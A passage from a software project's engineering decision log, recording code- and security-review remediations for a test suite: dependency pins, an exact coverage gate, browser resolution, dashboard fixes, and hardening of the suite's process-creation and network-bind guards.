Bounded by `test_coverage_gate.py` asserting the file exists, that the parsed precision is 2, that `coverage.Coverage` reads it, and that `addopts` still names no coverage option, and by the CI comment saying where the authoritative declaration lives. |

## §34 Code-review remediation — gate exactness, dependency closure, browser resolution, dashboard semantics and machine-recorded provenance

Scope: the twenty-five findings raised at this checkpoint — seventeen major and eight minor. Four are gates
that reported a verdict they could not support; three are claims a document made that the shipped code
contradicted; the rest are arithmetic, provenance and cross-platform gaps in the instructions a new
contributor is meant to follow. Files touched: `backend/requirements-dev.txt`, `backend/.coveragerc`,
`backend/tests/coverage_gate.py`, `backend/tests/test_coverage_gate.py`,
`backend/tests/test_dependency_closure.py`, `frontend/package.json`, `e2e/scripts/require-browser.js`,
`e2e/package.json`, `e2e/tests/analytics.spec.ts`, `.github/workflows/ci.yml`, `.gitignore`,
`docs/testing/dashboard-extract.py`, the four onboarding documents, the three `docs/testing/` artifacts and
`blitzy-deck/executive-summary.html`. Every row names the earlier row it supersedes or extends, and none of
those rows is rewritten, per D190. Two rows record a decision **not** to change code.

| # | Decision | Alternatives considered | Why this choice | Risks it carries |
|---|----------|-------------------------|-----------------|------------------|
| D292 | **Supersedes D270, and closes the escalation §23 recorded.** Pin `python-jose[cryptography]` at **3.5.0** rather than the plan's 3.3.0, keeping a one-line `# SECURITY:` marker in the manifest and the reasoning here. | (a) Apply D270 and hold 3.3.0, which is what shipped. (b) Raise to 3.4.0, the first fixed release. (c) Hold 3.3.0 and carry an audit allow-list entry. (d) Replace `python-jose` with `pyjwt`. | D270 held the pin at 3.3.0 on the reading that AAP §0.6.1's dependency table is a frozen specification. It is not: §0.1.4 freezes the endpoint shapes, the `Settings` field names, the Redux store shape, the zod contracts and the `api.ts` signatures, and names no dependency version — while §0.6.1 presents its table as the *empirically derived* stack, and the warmed environment the setup log records had already installed 3.5.0. So holding a version affected by CVE-2024-33663 (algorithm confusion) and CVE-2024-33664 (decompression bomb on compressed JWE) was a choice the plan never required. (b) fixes the same advisories while leaving a known-good later release unused. (c) documents an exposure instead of removing one. (d) rewrites `app/core/security.py`, production code outside the two authorized touches. Measured: the whole suite passes at 3.5.0 on CPython 3.9.13, and `from jose import jwt` — the entire production surface — is unchanged from 3.3.0. | The delivered manifest now differs from AAP §0.6.1 in one line, which a reader comparing the two will notice; this row is that difference's record. Neither advisory was ever reachable from a test here — only HS256 encode and decode with an explicit key are exercised — so the change removes a future production exposure rather than a present test one. |
| D293 | **Supersedes D271.** Declare `grpcio==1.80.0` and `grpcio-status==1.62.3` as **direct** pins, under a one-line `# CLOSURE:` marker naming the reason. | (a) Apply D271 and let grpcio arrive transitively, which is what shipped. (b) Pin `grpcio` only. (c) Pin both on the same minor line. (d) Stop patching gRPC in the guard, so the dependency stops being direct. | `backend/tests/conftest.py` patches `grpc`, `grpc.aio` and `grpc._channel` **by name, as strings**, which makes them a direct dependency of the test infrastructure that no import scan can see — and D271 removed exactly those two pins on the reasoning that they were transitive. Left undeclared, an install resolved `grpcio-status` to the pre-release **`1.63.0rc1`** on this host: a reproducibility defect rather than a theoretical one. (b) leaves the same hole one package wide. (c) is impossible — `grpcio-status` 1.63 and later require `protobuf>=6.31.1`, while the pinned `google-cloud-firestore`, `google-cloud-bigquery` and `google-api-core` all cap `protobuf<5`, and attempting 1.80.0 fails with `ResolutionImpossible`, measured. (d) removes a guarantee the egress guard exists to provide. | The two pins sit on different minor lines, which looks like an oversight and is not; the manifest marker and this row are the record. `grpcio-status` stays a version behind the runtime library until the pinned Google distributions raise their protobuf ceiling. |
| D294 | **Extends D101, D196 and D284.** Close the dependency contract in the **second** direction as well: every third-party module the test tree actually reaches must be provided by a distribution the manifest pins, enforced by `backend/tests/test_dependency_closure.py`. | (a) Keep only the manifest ⇄ installed direction, which is what shipped. (b) Assert a hand-written list of expected imports. (c) Shell out to `pipdeptree` or `pip check`. (d) Enforce it in CI with a `pip-compile --strict` step instead of in a test. | The shipped suite could prove that every pin was installed at the right version and that nothing was pinned twice, but not the opposite defect — a package the tests genuinely use that the manifest never names — which is precisely the defect D271 introduced. Discovery therefore has to see what an import scan cannot: an AST pass over `backend/tests/**/*.py`, a string-literal pass over the first argument of every `patch` and `import_module` call, **and** a read of the guard's own target tables out of the already-imported `tests.conftest`. Each discovered module is mapped to its providing distribution through `importlib.metadata`, keyed at one *and* two levels so `google.api_core` resolves to `google-api-core` rather than to whichever `google-*` distribution happens to own the namespace package, and classified with a purelib-before-stdlib location check. (b) is a second list to drift. (c) and (d) answer a different question — whether the installed graph is self-consistent — not whether the manifest covers what the tests touch. | The scan is heuristic at its edges: a module named only in a computed string, or reached through an `__import__` form this pass does not model, is invisible to it. It is a closure gate over what is statically discoverable plus what the guard declares, not a proof. 72 cases now, up from 41. |
| D295 | **Supersedes the sufficiency claim in D195, D226 and D252; D291's single-declaration ruling stands.** Keep `--cov-fail-under` for the in-run message, and add **`backend/tests/coverage_gate.py`** as the binding comparison: integer counts read from `coverage.json`, `covered * 100 >= threshold * statements` evaluated over `Fraction`, run as a second command immediately after the gated suite. | (a) Keep `precision = 2` as the gate, which is what shipped. (b) Raise the precision to 6, or to 10. (c) Set the threshold to `90.0000001` so the rounding band lands above 90. (d) Write a `pytest_sessionfinish` hook in `conftest.py`. (e) Fail the build from Codecov instead. | Those three rows each describe `precision = 2` as closing the rounding defect, and it does not: coverage.py compares `round(total, precision)` at *every* precision, so at two decimals any total in `[89.995, 90)` still rounds to `90.00` and passes a 90 threshold. (b) moves the band to `[89.99995, 90)` and changes nothing structural — there is no finite precision at which `--cov-fail-under=90` means "at least 90". (c) makes the printed threshold disagree with the documented one, and still rounds. (d) puts the gate inside the run that produces the report, so a crash mid-suite yields no verdict, and it would make `pytest.ini` carry the gate D291 deliberately keeps out of it. (e) is an annotation on a pull request, not a build failure. Two integers have no representable-value problem, so the exact comparison is the one form that answers the question asked; percentages are printed **truncated**, so a sub-threshold total can never render as `90.00`. Exit statuses are `0`, `1`, and — for a missing or unreadable report — **`2`**, because "nothing was measured" is a different failure from "measured low". | Two commands where a reader expects one, and a reader who runs only the first gets the rounded verdict. Every documented producer command and the CI job carry both, and `test_coverage_gate.py` asserts that the workflow still runs the second after the first, so the wiring cannot be dropped silently. |
| D296 | **Inverts the residual-band assertions D195 introduced.** Assert the three totals `17999/20000`, `899999/1000000` and `8999999/10000000` three ways: that the rounded comparison **admits** them, that the exact gate **rejects** them, and that the CLI exits non-zero on them. | (a) Keep asserting only that the band is admitted, which is what shipped. (b) Delete the band cases. (c) Assert the rejection and drop the admission premise. | The shipped suite asserted the tolerated band as *correct behaviour*, so a test locked in the defect and would have failed had anyone fixed it — the worst shape a test can take. (b) loses the demonstration that makes the two-command arrangement necessary in the first place. (c) loses the premise: the admission is what proves the exact gate does work the rounded one cannot, and stating it explicitly is what stops a later reader deciding the second command is redundant. | The suite now depends on coverage.py's rounding staying as it is. If a future release compares unrounded totals, the admission premises fail — and these rows are what explain that as good news rather than a regression. |
| D297 | Have the exact gate **refuse a report measured over the wrong scope** — any measured file outside the `--require-scope` packages, or any named package that contributed no measured file — and report the scope violation before the total. | (a) Gate on the total only. (b) Warn on scope and still gate on the total. (c) Compare the measured file set against a committed manifest of expected files. | A `coverage.xml` or `coverage.json` written by a wider `--cov` is indistinguishable from a gated one to every later reader, so the 90% bar can be satisfied against a denominator it was never calibrated for — which is how a whole-tree total reaches a panel labelled G1. Refusing structurally is what makes the canonical producer command canonical rather than merely recommended. The reciprocal check matters as much: a report covering one of the four packages describes fewer packages than it claims, and its total is meaningless against this threshold. Measured: a genuine whole-`app` report exits **1**, naming all eight out-of-scope files, before it would have printed 262/288. (b) is a warning nobody reads. (c) is a third list to maintain. | Adding a fifth gated package means updating the `--require-scope` arguments in the workflow and in three documented commands, or the gate refuses the very report it should accept. Windows and POSIX separators are normalised on both sides, which a naive extension could reintroduce. |
| D298 | **Supersedes the frontend third of D255.** Make the frontend readiness gate `npm run test:load` — `jest --ci --watchAll=false --runInBand --reporters=default -t "__readiness_probe_that_matches_no_test__"` — and keep `test:list` as a file census that is explicitly not a gate. | (a) Keep `jest --listTests`, which is what shipped. (b) Run the full suite as the readiness step. (c) Add a bespoke script that `require`s each test file. (d) Parse `--listTests --json`. | `jest --listTests` walks the filesystem against `testMatch` and imports nothing, so a suite with a broken import or a failing transformer is listed exactly like a healthy one. Measured both ways with one unresolvable import added: `--listTests` still listed all 24 files and exited **0**, while the load probe exited **1** naming the suite and the missing module. Jest cannot know a test's *name* until it has transformed the file, evaluated it at module scope and run its `describe` callbacks, so a run whose name filter matches nothing loads every suite and every module in its import graph and then executes no test body — readiness with no assertions. (b) is not a readiness check, it is the suite, and it cannot run before itself. (c) reimplements the resolver, the transformer and the module registry the gate exists to exercise. (d) still resolves no import. `--runInBand` keeps the retained output free of worker-pool teardown noise. | The probe's filter is a magic string; a test ever named `__readiness_probe_that_matches_no_test__` would silently execute one body. `--reporters=default` is load-bearing rather than cosmetic — see D299. |
| D299 | Pass `--reporters=default` to the load probe, so it **replaces** the configured reporter list. | (a) Leave the configured reporters in place. (b) Rely on CI's step order — readiness before the suite — to overwrite the stub stream. (c) Point `jest-junit`'s `outputName` at a throwaway path for the probe. | The probe is a real Jest run, so the configured `jest-junit` reporter writes `frontend/reports/jest-junit.xml` — an all-skipped stream declaring `tests="370" failures="0"` in which every case is pending, which no consumer can distinguish from a run where nothing executed, and which the dashboard's `passed = tests - failures - errors - skipped` renders as 0 passed. Measured: the file's SHA-256 changed across a probe without the flag, and is byte-identical with it. This is the same hazard `pytest --collect-only` carries, and (b) is the mitigation already relied on there — but ordering protects CI only, and a developer who runs readiness after the suite silently loses the result stream. (c) writes a file nobody cleans up and still needs the same flag discipline to avoid a name collision. | A future reporter that must run during readiness has to be re-added explicitly on that command line. The flag's purpose is stated in `ci.yml` beside the step, in `frontend/TESTING.md` §9 and in `backend/tests/README.md` §8, because a flag whose absence is invisible until a downstream reading looks wrong is worth stating three times. |
| D300 | **Supersedes D264's resolution order and its characterisation of `browsers:verify`.** Rewrite `e2e/scripts/require-browser.js` to resolve in four steps — `PLAYWRIGHT_CHROMIUM_EXECUTABLE`, then `CHROME_BIN`, then the platform's vendor install locations, then `chromium.executablePath()` — to publish the resolved executable on **every** route, to read the resolved build's own version, and to accept `--min-major <n>`. | (a) Keep the hand-rolled cache scan, which is what shipped. (b) Keep the scan but sort the `chromium-*` directories by revision number. (c) Publish only on the explicit and vendor routes. (d) Drop the cache route entirely. | The shipped cache route scanned the browsers directory for `chromium*` entries and took the **lexicographically first**, which is not the build the runner loads: Playwright loads the directory matching its own pinned revision and nothing else. It also mis-modelled `PLAYWRIGHT_BROWSERS_PATH=0`, which relocates the cache *inside* the `playwright-core` package rather than selecting the default root, and it then left `PLAYWRIGHT_CHROMIUM_EXECUTABLE` unset on that route — so the gate could pass on a browser the run would never launch. `chromium.executablePath()` answers all three at once and is already what `verify-browser.js` uses, so this removes a divergence rather than adding a mechanism. `CHROME_BIN` is added because `ci.yml`'s own comment claimed the script honoured it and it did not: implementing the claim costs less than deleting it and loses no property, since the variable is treated exactly like route 1 — authoritative in both directions. Publishing on every route is what makes the path logged provably the path launched. And D264's parenthetical that `browsers:verify` "always exits 0" was already untrue of the delivered script: it is the narrower **reporter** — two filesystem locations, no vendor search, nothing published — and it also exits 1 when neither is launchable. | Four routes are more surface than two, and an image exporting a stale `CHROME_BIN` now fails the gate on it rather than falling through — the intended contract for an explicitly named browser, but it will surprise someone. `--min-major` is a floor a maintainer has to remember to raise. |
| D301 | **Supersedes D198 and the CI half of D264.** Remove the job-level `PLAYWRIGHT_CHROMIUM_EXECUTABLE: /usr/bin/google-chrome` from the `e2e` job, replace it with `E2E_MIN_CHROMIUM_MAJOR: '120'`, run the gate with that floor, retain its reading as `e2e/reports/browser.txt`, and delete the hand-rolled `test -x "${CHROME_BIN:-/usr/bin/google-chrome}"` step. | (a) Keep the hardcoded path. (b) Keep it and add the floor as well. (c) Set `CHROME_BIN` at job level instead. (d) Pin a container image known to carry a browser. | A job-level value **is** route 1, and route 1 is authoritative — so hardcoding it short-circuited the resolver the same job then ran, making the browser an unrecorded, mutable, image-supplied dependency that no step validated for version. Setting nothing lets the resolver do the job it exists for and record what it found; a floor turns "whatever the image ships" into a checkable claim; and retaining the reading makes which browser produced a result recoverable from the artifacts rather than only from a log. (b) keeps the short-circuit. (c) moves the same problem one route down. (d) is a change to the CI platform, not to the test layer. | The job now depends on the runner image carrying a Chromium-family browser at one of the vendor paths — the same dependency D264 accepted, now failing loudly with a remedy instead of silently launching something unrecorded. `120` is a judgement rather than a measurement: below every currently shipping stable line, above the releases that predate the APIs these specs use. |
| D302 | Change six semantics in `docs/testing/dashboard-extract.py`: report K2 as the **minimum** of twelve independent package/metric cells; require `frontend/coverage/lcov.info` under `--require-all` and print `detail unavailable` when it is absent; subtract JUnit `errors` as well as `failures` and `skipped` from a flow's pass count; classify the three root suites into a named `Backend infrastructure` layer; read frontend readiness from `load-tests.txt` and the exact gate's verdict from `coverage-gate.txt`, surfaced as **K5b**; and render a **G5** row so §3.1 lists every gate the template itself defines. | (a) Leave each as it was. (b) Report K2 as the mean of the twelve cells. (c) Treat a missing `lcov.info` as an empty uncovered-line set. (d) Leave the root suites in `Backend other`. | Each shipped behaviour could report green over a red gate, or absence as evidence. K2 summed three *independently* gated packages into one figure, so a Jest threshold group failing at 61% could be averaged out of sight — measured on a perturbed summary, the summed reading stayed green while the group's own gate failed. (b) has the identical defect: Jest gates each group separately, so the only faithful summary of twelve comparisons is the worst of them. `lcov.info` is the **only** source of frontend uncovered-line detail, and (c) renders its absence as "nothing uncovered" — absence reported as a clean result. A flow carrying `errors="2"` counted those two as passes. `Backend other` is an unexplained bucket for 211 tests whose subject is the test system itself. And a gate the template defines but the rendering omits is a gate no reader can check. | Cells with an empty denominator are excluded from the minimum, and the count of them is stated — honest, but it needs reading. The `Backend infrastructure` prefixes are a lookup table a new root suite must be added to, which the fallback label now says out loud. |
| D303 | **Supersedes the provenance form the four onboarding documents and `DASHBOARD-TEMPLATE.md` §7 previously used.** Stop transcribing a commit hash into prose. Have the extractor emit a **§1.0 Provenance of this reading** block — branch, commit read from `.git`, UTC timestamp, Python version, platform, and the browser and runner versions read from `e2e/reports/browser.txt` — and have every document state the command, the runtime and the artifact, then point there for the fourth element. | (a) Keep transcribing, and correct the wrong hash. (b) Transcribe the *previous* commit and explain the offset. (c) Add a pre-commit hook that rewrites the hashes. (d) Drop the commit element from the provenance form. | A hash written into a sentence necessarily names a different tree from the run it describes, because the sentence lands in a *later* commit than the measurement. Not an abstract hazard: five documents cited a measured commit `8a255fb` that is not a git object in this repository at all, so every figure resting on it was unreproducible in exactly the way the provenance form exists to prevent. (a) reproduces the defect on the next edit. (b) documents an offset instead of removing it. (c) makes a hook a correctness dependency and still cannot say which run a figure came from. (d) loses the one element that makes a figure re-derivable. Reading `.git/HEAD`, the ref it names, and `packed-refs` as a fallback needs no dependency and cannot drift, because it happens at the moment the reading is produced. | A reading is now a generated artifact, and a figure quoted without one beside it is a claim about some unnamed tree — which the form says explicitly. The extractor reads `.git` directly rather than shelling out to `git`, so an exotic layout — a worktree pointer file, a submodule gitdir indirection — is a case it does not model. |
| D304 | Write both extractor outputs into `docs/testing/reports/`, add that one path to `.gitignore`, and decode every artifact **by byte-order mark**. | (a) Leave `run-write-up.md` and `run.json` at the repository root, which is what shipped. (b) Designate them committed records. (c) Convert the captures to UTF-8 inside the documented commands instead. (d) Pass an encoding flag to `Tee-Object`. | Neither file was ignored nor designated a record, so a documented command dirtied the working tree with a generated artifact — and a reading *is* generated, like every other artifact in §2. The decoding half was found by executing the documented PowerShell block verbatim: PowerShell 5.1's `Tee-Object` writes **UTF-16LE** and has no `-Encoding` parameter, so a UTF-8 read saw NUL-separated characters, every pattern silently failed to match, and three good readiness results rendered as absent and FAIL. (c) adds a conversion step to every documented capture, on one platform only. (d) is impossible on 5.1. Decoding by BOM — UTF-32 both endiannesses, UTF-16 both, UTF-8 with BOM, else plain UTF-8 — makes an artifact captured on either platform read identically, which is what a cross-platform instruction requires. | `.gitignore` gains a pattern, against D287's preference for keeping that file small; one path for a directory the documented commands create is the smallest form that closes it. A file that is genuinely UTF-16 *content* rather than a BOM-prefixed capture is still not modelled. |
| D305 | **Do not** widen `ALLOWED_CHILD_PROCESS_COMMANDS` to admit the bare `ver` command line, and correct the documentation that claimed `pytest -n auto` reports the same counts. | (a) Add an equally exact pattern for the bare `ver` form. (b) Widen the pattern to any `cmd /c`. (c) Drop `pytest-xdist` from the manifest and the documented commands. (d) Leave the documentation as it was. | Measured: `pytest -n 2` and `-n auto` both end in an `INTERNALERROR` at exit **3**, because an xdist worker's `pytest_sessionstart` calls `platform.platform()`, which on Windows reaches `platform.win32_ver` and then `_syscmd_ver`, and CPython 3.9's `_syscmd_ver` tries `('ver', 'command /c ver', 'cmd /c ver')` with `shell=True` — the first rendering as the bare command line `ver`, while the allow-list admits only the `cmd /c ver` form. The guard is behaving exactly as specified; what was wrong was a document claiming the parallel run worked. Nothing is gated on `-n`: the serial suite *is* the suite, it finishes in about eight seconds warm, and CI runs serially on Linux where `win32_ver` is never reached. So (a) and (b) change the behaviour of the one component every other suite's isolation rests on, for a convenience no gate needs — a decision for whoever owns the guard's contract, not a side effect of a documentation fix. (c) removes a working capability from every non-Windows host. (d) leaves a false claim standing. | Windows contributors cannot run the suite in parallel, and the reason is the suite's own guard. `backend/tests/README.md` §8 states the mechanism and §12 carries both closures as a next task, so the limitation is documented rather than discovered. |
| D306 | Add a **PowerShell** install leg to `README.md` — `py -3.9 -m venv .venv-backend`, then `.\.venv-backend\Scripts\Activate.ps1` — and state the direct-interpreter form beside it. | (a) Leave the POSIX-only block. (b) Add a `Makefile` or task runner that abstracts the difference. (c) Commit an activation wrapper script. | The only documented activation was `. .venv-backend/bin/activate`, which does not exist on Windows — a venv there has `Scripts\`, not `bin/` — so every documented backend command assumed a `pytest` on `PATH` that a Windows contributor had no documented way to obtain. Rule 3 asks for a clean machine to a running suite without questions, and one shell's instructions are not cross-platform instructions. Naming the interpreter directly, `..\.venv-backend\Scripts\python.exe -m pytest`, is given as well, because that is what a non-interactive script should do and it needs no activation at all. (b) and (c) add a build dependency to avoid writing four lines. | Two install blocks can drift. Only leg 1 differs between them, and the PowerShell block repeats legs 2 and 3 verbatim, so any divergence is visible in one place. |
| D307 | Re-measure and restate **every** count this checkpoint's own changes moved, rather than leaving figures that were true when written, and replace any demonstration that no longer reproduces with one that does. | (a) Update only the counts a finding named. (b) Round the counts, or describe them qualitatively. (c) Have the extractor own every count and delete them from prose. | Adding 31 closure cases and 42 coverage-gate cases moved the backend totals from 774/771 to **847/844**, which falsified a dozen figures no finding mentioned: the layer split, the per-suite expectations, the JUnit root attributes quoted as evidence, the "collects all N tests" statement about running from the wrong directory, and the deck's 1,136 passing total. The rounding demonstration had decayed the same way — its `--cov=app --cov-fail-under=90` example could no longer produce the defect at this tree's totals, so it is restated as the pair that does reproduce here: `--cov-precision=0 --cov-fail-under=91` exits **0** on a total of 90.97%, while the same threshold without the precision flag exits **1**. (a) leaves a document accurate exactly where it was audited. (b) removes the property that makes a count checkable. (c) is the right long-run answer and is why §1.0 and §1.1 exist, but the onboarding documents legitimately state counts in prose, and a reader needs the number where the claim is made. Each restated figure was re-derived on this host: 847 collected by the collection gate, `483 + 3 + 150 + 72 + 62 + 77` closing on the whole, 25 manifest pins, 24 frontend suites over 370 identities, 19 specs across five files at 4/5/3/4/3. | Prose counts drift again on the next change, and the only defence is that the same re-measurement is now the documented producer sequence any contributor runs. Durations and artifact byte sizes are deliberately *not* treated as suite properties: each is labelled as belonging to the single invocation that wrote it. |
| D308 | **Supersedes D266. D92 stands untouched.** Record that the missing-`Chart.register` construction failure is **asserted** in the browser layer rather than being a documented, unverified ceiling, and correct every artifact D266 pointed at — including the stale paragraph in `e2e/tests/analytics.spec.ts`'s own header — together with the census that followed from it: 19 tests over five specs, none skipped. | (a) Leave D266 standing and treat the delivered spec as the anomaly. (b) Skip the chart test again, so D266 becomes true. (c) Supersede D266 but keep the census at "18 passed, 1 skipped". | D266 rests on two statements the delivered suite falsifies: that nothing executing observes the failure, and that "the harness stub rejects on every path so `renderCharts` is never reached". The stub now carries an opt-in forwarding header, and the analytics spec's chart test uses it to hand Chart.js a live 2D context, then asserts the unregistered-part report, the uncaught page error, React's attribution to `TrendCharts`, the unmount of both heading and canvas, and a single request — the ceiling asserted rather than described. (b) would restore a row's truth by removing coverage, which is backwards. (c) leaves five documents quoting a census the JUnit stream contradicts: measured `tests="19" failures="0" errors="0" skipped="0"`, per spec analytics 4, configuration 5, dashboard 3, isolation 4, tweets 3. D92's rejection of the jsdom shims is untouched, because it is about the Jest layer, where there is still no 2D context to acquire. | The chart test asserts a *destructive* outcome — the route unmounts — so it has to remain the only test that opts into forwarding, and its allow-list must keep admitting either half of Chart.js's registry lookup, which is why the pattern matches `scale` or `controller`. The AAP §0.7.3 ceiling is now closed in one layer only; the jsdom layer's ceiling, and the one-line production change that would close both, remain suggested next tasks. |
| D309 | Correct the executive deck's enforcement slide and its headline passing total rather than leaving them at the state they described before this checkpoint: the readiness row now reads as a pipeline gate that loads every suite, and the total moves from 1,136 to the re-measured 1,209. | (a) Leave the slide as it was. (b) Delete the readiness row. (c) Replace the count with a qualitative phrase. (d) Rebuild the slide around the new gates. | The slide's third row read "A one-command readiness check, run locally. Not yet a pipeline step", which was true when written and is now false twice over — CI gates readiness on all three layers, and the frontend gate loads every suite rather than listing filenames. A deck that describes a weaker pipeline than the one delivered understates the work as surely as an overstatement misrepresents it, and Rule 4's audience cannot check it against a workflow file. (b) removes the one row that tells a non-technical reader the suite is proven to load. (c) removes the checkable number. (d) is churn: the slide's four rows and its diagram already carry the right shape. The count is corrected at both sites because the same stale figure appears in the KPI card and in the closing recap, and the passing total moved when this checkpoint added 73 backend cases. What the slide does **not** claim is that CI was observed running: `DASHBOARD-TEMPLATE.md` §7 records that the pipeline has never run on a hosted runner, and that distinction stays there, where there is room to state it. | A slide is a projection of measured figures with no producer behind it, so it drifts on the next change; every figure on it is re-derivable from §1.1 of the dashboard, which is the mitigation. Rule 4's constraints were re-verified after the edit — 16 sections, at least one non-text visual per slide, no emoji, no fenced code, the four pinned CDN versions and their integrity hashes unchanged — because a content edit is exactly where a bullet or word cap slips. |

## §35 The install invocation form

Scope: one further finding at this checkpoint, on the first block a new contributor pastes. §34 added the
PowerShell leg the guide had been missing (D306); this row settles which *form* of the npm command both legs
use, because measurement contradicted the premise the shipped form rested on. The D190 convention governs:
D290 and D306 are left verbatim and this row names the halves of each that it replaces.

| # | Decision | Alternatives considered | Why this choice | Risks it carries |
|---|----------|-------------------------|-----------------|------------------|
| D310 | **Supersedes D290's invocation-form half and D306's two npm lines; the ordering half of D290 and the virtual-environment half of D306 both stand.** Write the two npm install legs of `README.md` as `(cd frontend && npm install)` and `(cd e2e && npm install)`, matching `e2e/README.md` §2 and every other command in both guides, write the same two legs of the PowerShell block as `Push-Location <dir>; npm install; Pop-Location`, and describe npm's actual behaviour rather than the assumed one. | (a) Keep `npm --prefix <dir> install`, which is what D290 chose and what shipped. (b) Keep it and add a root `package.json` with workspaces so the prefix form resolves. (c) Keep it and document the failure as a known wart. (d) Use `npm install --prefix <dir>`, the other flag position. | The commands did not work. Measured from the repository root on npm 10.9.8, **both** `npm --prefix frontend install` and `npm install --prefix frontend` fail with `ENOENT ... open <root>/package.json`: `npm install` reads the manifest of the directory it is invoked from and `--prefix` does not change that in either position, and this repository has no root manifest. So D290's premise — that the prefix form is the root-stable one — held for `npm --prefix <dir> run <script>`, which does resolve the target's manifest and which the run tables rightly use, and not for `install`. Rule 3 makes this a defect rather than a nitpick: the first block a new developer pastes has to work. (b) creates a root manifest the AAP's change boundary does not authorize and would alter how every install in the repository resolves. (c) leaves a guide whose opening instruction fails. (d) fails identically, as measured. The subshell parentheses were already described as load-bearing in the same paragraph, so the prose needed no change to match the commands — only the commands needed to match the prose. | The `(cd … && …)` form is POSIX-shell syntax and the block is fenced as `bash`; PowerShell has no `( … )` grouping of its own, so the PowerShell block uses `Push-Location`/`Pop-Location` for the same property, and the paragraph beneath both blocks says so once rather than twice. Verified after the change: both commands succeed from the repository root, both rejected forms still fail with the recorded ENOENT, and `pwd` after the block is still the repository root. |

## §36 Security-review remediation — closing the guards' declared perimeter, containing the harness origin, and binding the evidence

Scope: the eighteen decisions taken in response to a whole-project security assessment. They fall into five
groups, and the grouping is the finding rather than a tidy-up: five widen a guard whose *documentation* already
claimed the perimeter its code did not cover; three contain the end-to-end harness's own origin, which every
earlier row had treated as trusted because it is loopback; three bind evidence — what a retained artifact
carries, how long it is kept, and which browser actually ran; four are the reader-facing consequences,
including the gap register this section's own declines are recorded in and the ledger of what was proved to
fail closed; and three settle the executive deck, which asserted the same absolute the documents did and
carried one diagram that did not say what it appeared to say.

One theme runs through all four, and it is worth naming because it is what made these findings findable: in
every case the *claim* was already written down and the *code* had not caught up. A guard that refuses
`os.system` while `os.spawnv` walks past it is not a partial guard — it is a guard whose documentation is
false, and the documentation is what a reader relies on. Each row below therefore records both the code change
and the sentence it was reconciled with.

D224 is **not** superseded and needs no correction: its Risks column already stated that `_BOUND_PORTS_LOCK`
"had to become an `RLock`", and the defect was that the code still held a plain `Lock`. The row was right and
the implementation had not met it; D311's group closes that, and the row now describes what is there.

| # | Decision | Alternatives considered | Why this choice | Risks it carries |
|---|----------|-------------------------|-----------------|------------------|
| D311 | Deny **every** process-creation entry point CPython exposes, in three declared groups: `CHILD_PROCESS_FACTORIES` judged against the allow-list by their command argument, `NATIVE_PROCESS_FACTORIES` (`_winapi.CreateProcess`) judged by a renderer that reads the command from *either* of its first two arguments, and 21 `UNCONDITIONAL_PROCESS_FACTORIES` — the eight `os.spawn*`, both `posix_spawn*`, `fork`, `forkpty`, the eight `exec*` and `multiprocessing.process.BaseProcess.start`. | (a) Keep `os.system` plus `subprocess.Popen.__init__`, the shape before this row. (b) Add only the `spawn*` family, the nearest neighbours. (c) Guard at a lower layer instead — patch `os.fork` and let everything funnel through it. (d) Treat the gap as documentation drift and narrow the claim in `backend/tests/README.md` rather than widening the code. | The suite's own README and traceability row asserted that no test can start a child process. That was false by eleven distinct routes, and `subprocess` itself does not go through the two that were guarded — on Windows it reaches `_winapi.CreateProcess`, which is why that one needs its own renderer: `subprocess` passes `None` as the application name and the command in the second argument, so a renderer reading only the first would judge `None` against the allow-list and admit everything. (b) leaves `exec*` and `multiprocessing`. (c) does not hold on Windows, which has no `fork`. (d) is the option that keeps a security claim honest by lowering it, and the claim is one the AAP's reliability constraints require rather than one this suite invented. | Twenty-four patch sites is a large surface, and a CPython release that adds a twenty-fifth reopens the gap silently. Bounded by `test_guard_contract.py`, which now derives its probe set from the three declared tuples and fails if a probe names a target no group declares, so the contract and the code cannot drift apart without a red test. |
| D312 | Make `_guard_bind` **refuse** a bind to a routable or unspecified address, rather than binding it and declining to record the port as owned. | (a) Keep recording-without-refusing. (b) Refuse only the unspecified addresses (`0.0.0.0`, `::`, `''`). (c) Refuse at `listen` instead of `bind`. | Not recording a wildcard bind stopped the guard *authorizing* the port, which is a different thing from stopping the bind: the socket was still created and still reachable from off-host, so a test that opened one had genuinely widened the machine's attack surface while the ledger stayed clean. That is the worst of the two states, because the evidence says nothing happened. (b) leaves an explicit bind to a routable interface admitted. (c) is later than necessary and misses a connectionless socket, which never listens. | A test that legitimately needs an off-host listener now fails, and the suite has none. `BINDABLE_LOOPBACK_HOSTS` is `LOOPBACK_HOSTS` minus the empty string, so the two sets stay derived from one another rather than maintained twice; `test_egress_guard.py` covers the wildcard, IPv6-wildcard, routable, three loopback spellings, an unreadable-address family and a Unix path. |
| D313 | Attribute correlation identifiers through `contextvars` — `_CURRENT_TEST_ID` and `_GUARD_SUBJECT` — with a named `UNATTRIBUTED_SUBJECT` for records produced outside any test context. | (a) Keep the module-global `_current_test_id`. (b) Key attribution on `threading.get_ident()` and a per-thread map. (c) Drop the identifier from guard records and let the reader infer it from ordering. | A module global names whichever test the *main* thread most recently entered, so a record produced by a background thread — which is exactly the situation the thread guards exist to catch — was labelled with an unrelated test. A wrong identifier is worse than none: it sends the reader to a test that did nothing. (b) works but has to be cleaned up by hand on every exit path, and a missed one leaks the same wrong answer. (c) discards the correlation Rule 2 asks for. | A `ContextVar` is not inherited by a bare `threading.Thread`, so a record from one reports `UNATTRIBUTED_SUBJECT` rather than the test that started the thread. That is the honest answer for a record whose context genuinely is not the test's, and it is stated in the constant's own name so a reader is not left guessing. |
| D314 | Restore the interpreter to the state the session found it in: snapshot any pre-existing `builtins.Optional` and put the original value back, and evict the fail-closed shims from every cached consumer module at teardown, recording each binding as it is installed. | (a) Keep deleting `builtins.Optional` unconditionally when it was absent and leaving it overwritten when it was not. (b) Leave the shims in place, since the process is about to exit. (c) Stop shimming and skip the four suites whose modules cannot import. | Both halves are the same defect: the session mutated global state and did not put it back, so anything sharing the interpreter afterwards — `pytest -p no:randomly`, an embedded run, a plugin's own teardown — saw a namespace this suite had rewritten. (b) is true of the common case and false of exactly the cases that matter. (c) abandons coverage the AAP requires, over a problem that is solvable in ten lines. | The eviction has to know both the module that *defines* a shimmed symbol and every module that imported it, which `_record_shimmed_binding` now tracks; a consumer imported after teardown would not be covered. Bounded by teardown being the last thing the session does, and by the restoration being asserted rather than assumed. |
